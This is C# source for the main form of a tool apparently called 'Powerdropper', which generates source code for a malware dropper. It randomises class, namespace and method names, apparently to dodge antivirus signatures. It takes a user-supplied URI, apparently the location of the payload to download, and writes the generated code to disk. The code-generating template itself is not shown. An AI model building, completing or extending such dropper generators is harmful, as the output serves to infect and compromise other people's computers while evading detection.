using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Powerdropper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (saveFileDialog1.ShowDialog() == DialogResult.OK )
            {
                Config config = new Config();
                config.Classname = RandomString(25);
                config.Namespace = RandomString(10) + "." + RandomString(10);
                config.MethodName = RandomString(25);
                config.MethodName2 = RandomString(25);
                config.MethodName3 = RandomString(25);
                config.ApplicationData = RandomString(25);
                config.TargetUri = RandomString(25);
                config.Uri = textBox1.Text;

                SourceBuilder builder = new SourceBuilder();
                string source = builder.Build(config);

                File.WriteAllText(saveFileDialog1.FileName, source);
            }
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
